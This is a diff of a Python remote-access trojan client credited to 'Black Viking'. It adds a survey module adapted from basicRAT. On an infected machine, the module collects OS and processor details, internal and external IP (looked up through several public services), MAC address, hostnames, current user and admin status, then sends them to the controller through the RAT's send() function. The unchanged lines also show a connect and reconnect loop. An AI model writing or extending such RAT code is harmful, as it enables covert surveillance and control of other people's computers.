@@ -3,9 +3,8 @@
 #
 #
 
-"""
-[~] Author : Black Viking
-"""
+__author__ = "Black Viking"
+__date__   = "17.03.2017"
 
 END_OF_FILE = "(((END_OF_FILE)))"
 
@@ -22,6 +21,7 @@ import getpass
 import platform
 import time
 import re
+import uuid
 
 if os.name == "nt":
     import ctypes
@@ -114,19 +114,92 @@ def messageBox(text):
     t.start()
     
 def info():
-    try:
-        ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
-    except:
-        ip = "x.x.x.x"
-        pass    
+# basicRAT survey module
+# https://github.com/vesche/basicRAT
+#
+    SURVEY_FORMAT = '''
+    System Platform     - {}
+    Processor           - {}
+    Architecture        - {}
+    Internal IP         - {}
+    External IP         - {}
+    MAC Address         - {}
+    Internal Hostname   - {}
+    External Hostname   - {}
+    Hostname Aliases    - {}
+    FQDN                - {}
+    Current User        - {}
+    System Datetime     - {}
+    Admin Access        - {}'''
 
-    message = """
-[>] Username\t: %s
-[>] Hostname\t: %s
-[>] System\t: %s
-[>] Date\t: %s
-[>] IP Adress\t: %s
-"""%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
+
+    def run(plat):
+        # OS information
+        sys_platform = platform.platform()
+        processor    = platform.processor()
+        architecture = platform.architecture()[0]
+
+        # session information
+        username = getpass.getuser()
+
+        # network information
+        hostname    = socket.gethostname()
+        fqdn        = socket.getfqdn()
+        internal_ip = socket.gethostbyname(hostname)
+        raw_mac     = uuid.getnode()
+        mac         = ':'.join(('%012X' % raw_mac)[i:i+2] for i in range(0, 12, 2))
+
+        # get external ip address
+        ex_ip_grab = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
+                       'ipecho.net/plain', 'myexternalip.com/raw',
+                       'wtfismyip.com/text' ]
+        external_ip = ''
+        for url in ex_ip_grab:
+            try:
+                external_ip = urllib2.urlopen('http://'+url).read().rstrip()
+            except IOError:
+                pass
+            if external_ip and (6 < len(external_ip) < 16):
+                break
+
+        # reverse dns lookup
+        try:
+            ext_hostname, aliases, _ = socket.gethostbyaddr(external_ip)
+        except (socket.herror, NameError):
+            ext_hostname, aliases = '', []
+        aliases = ', '.join(aliases)
+
+        # datetime, local non-DST timezone
+        dt = time.strftime('%a, %d %b %Y %H:%M:%S {}'.format(time.tzname[0]),
+             time.localtime())
+
+        # platform specific
+        is_admin = False
+
+        if plat == 'win':
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+
+        elif plat in ['nix', 'mac']:
+            is_admin = os.getuid() == 0
+
+        admin_access = 'Yes' if is_admin else 'No'
+
+        # return survey results
+        return SURVEY_FORMAT.format(sys_platform, processor, architecture,
+        internal_ip, external_ip, mac, hostname, ext_hostname, aliases, fqdn,
+        username, dt, admin_access)
+
+    plat = sys.platform
+    if plat.startswith('win'):
+        plat = 'win'
+    elif plat.startswith('linux'):
+        plat = 'nix'
+    elif plat.startswith('darwin'):
+        plat = 'mac'
+    else:
+        plat = 'unk'
+
+    message = run(plat)
     send(message)
 
 def connect():
@@ -192,7 +265,8 @@ def start():
         try:
             connect()
             main()
-        except:
+        except Exception as e:
+            print e
             start()
 
 if __name__ == "__main__":
